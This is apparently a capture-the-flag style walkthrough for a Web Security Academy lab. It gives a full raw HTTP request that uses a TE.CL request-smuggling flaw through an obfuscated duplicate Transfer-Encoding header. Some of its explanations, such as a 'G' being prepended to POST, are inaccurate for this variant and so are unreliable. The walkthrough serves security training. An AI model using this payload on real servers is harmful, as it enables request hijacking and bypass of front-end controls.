# Exploiting HTTP Request Smuggling with Obfuscated TE Header

This guide provides a clear, creative, and organized solution to exploit an HTTP request smuggling vulnerability by obfuscating the `Transfer-Encoding` header. The objective is to craft a malicious request that manipulates the server’s request processing, resulting in an error response indicating a smuggled method, solving the lab.

## Objective
Send a specially crafted HTTP request with an obfuscated `Transfer-Encoding` header to exploit a TE.CL (Transfer-Encoding/Content-Length) vulnerability, causing the server to return a response with the message: **"Unrecognized method GPOST"**.

## Prerequisites
- Burp Suite with the Repeater module configured.
- The lab URL: `0aa0009c03bb498880677613003500ad.web-security-academy.net`.
- Basic understanding of HTTP request smuggling and header obfuscation techniques.

## Background on TE.CL with Obfuscated TE Header
A TE.CL vulnerability occurs when a server prioritizes the `Transfer-Encoding: chunked` header over the `Content-Length` header, allowing attackers to smuggle a partial request. In this lab, the `Transfer-Encoding` header is obfuscated by including a duplicate header with a different value (e.g., `Transfer-encoding: cow`), which the server may still process as chunked encoding. This enables smuggling a `GPOST` method to disrupt subsequent requests.

## Steps to Solve the Lab

### Step 1: Configure Burp Repeater
1. Open Burp Suite and navigate to the **Repeater** tab.
2. Go to the Repeater menu and **uncheck** the **"Update Content-Length"** option to prevent Burp from modifying the `Content-Length` header.
3. Ensure Burp’s browser is set up to intercept traffic for the lab URL.

### Step 2: Craft the Malicious Request
1. In Repeater, create a new request with the following structure:
   ```http
   POST / HTTP/1.1
   Host: 0aa0009c03bb498880677613003500ad.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 4
   Transfer-Encoding: chunked
   Transfer-encoding: cow

   5c
   GPOST / HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15

   x=1
   0


   ```
2. **Explanation of the Request**:
   - **Content-Length: 4**: Specifies a body length of 4 bytes (covering `5c\r\n`).
   - **Transfer-Encoding: chunked**: Indicates chunked encoding, which the server prioritizes.
   - **Transfer-encoding: cow**: An obfuscated duplicate header that may be ignored or processed, allowing the `chunked` encoding to take effect.
   - **Body**: The `5c` (92 bytes in hexadecimal) chunk includes a smuggled `GPOST` request, followed by `x=1` and terminated by `0\r\n\r\n`.
   - **Trailing Sequence**: The `\r\n\r\n` after the final `0` is critical to properly terminate the chunked encoding.

### Step 3: Send the Request Twice
1. Send the crafted request in Repeater.
2. Immediately send the same request again.
3. **Observation**: The second response should contain the error message:
   ```
   Unrecognized method GPOST
   ```
4. **Why Twice?**:
   - The first request smuggles the `GPOST` request into the server’s request queue.
   - The second request is processed with the smuggled `G` prepended to its method (`POST` becomes `GPOST`), causing the server to reject it as an invalid method.

### Step 4: Verify Success
1. Confirm the second response includes the expected error: **"Unrecognized method GPOST"**.
2. If the error is not received, verify:
   - The `Content-Length` is set to `4`.
   - The chunk size `5c` and trailing `\r\n\r\n` are correctly formatted.
   - The duplicate `Transfer-encoding: cow` header is included exactly as shown.
   - The "Update Content-Length" option remains unchecked in Repeater.
3. **Observation**: Receiving the error message confirms successful exploitation of the TE.CL vulnerability with an obfuscated `Transfer-Encoding` header, solving the lab.